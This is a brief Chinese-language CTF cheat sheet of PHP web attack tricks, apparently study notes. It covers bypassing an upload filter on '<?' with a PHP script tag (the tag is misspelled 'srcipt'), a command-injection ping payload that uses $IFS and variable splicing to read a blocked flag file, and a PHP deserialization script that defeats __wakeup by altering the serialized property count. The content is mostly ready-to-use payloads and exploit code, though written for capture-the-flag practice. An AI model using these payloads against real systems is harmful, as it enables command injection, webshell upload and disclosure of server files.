#### 文件上传
##### 1、上传文件，发现后台检测了文件内容包含<?，则可以通过一下方法绕过
```javascript
<script language="php">
    //中间写php代码
<srcipt>
```

#### 命令执行
##### 1、在获取所需要的文件时，假如屏蔽了文件名(e.g.flag.php屏蔽了flag)
```
ping 127.0.0.1;a=g;c\a\t$IFS$fla$a.php(同时屏蔽了空格和单引号)
例题:[GXYCTF2019]Ping Ping Ping
```

#### 序列化和反序列化
##### 1、遇到对private的序列化不能直接复制序列化结果
```php
#例题:Web_php_unserialize

<?php
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
$a = new Demo('fl4g.php');
$a_1 = serialize($a);
echo $a_1 . "</br>";
$a_1 = str_replace("O:4", "O:+4", $a_1);
echo $a_1 . "</br>";
$a_1 = str_replace("1:", "2:", $a_1);
echo $a_1 . "</br>";
echo base64_encode($a_1)."<br/>";

?> 
```
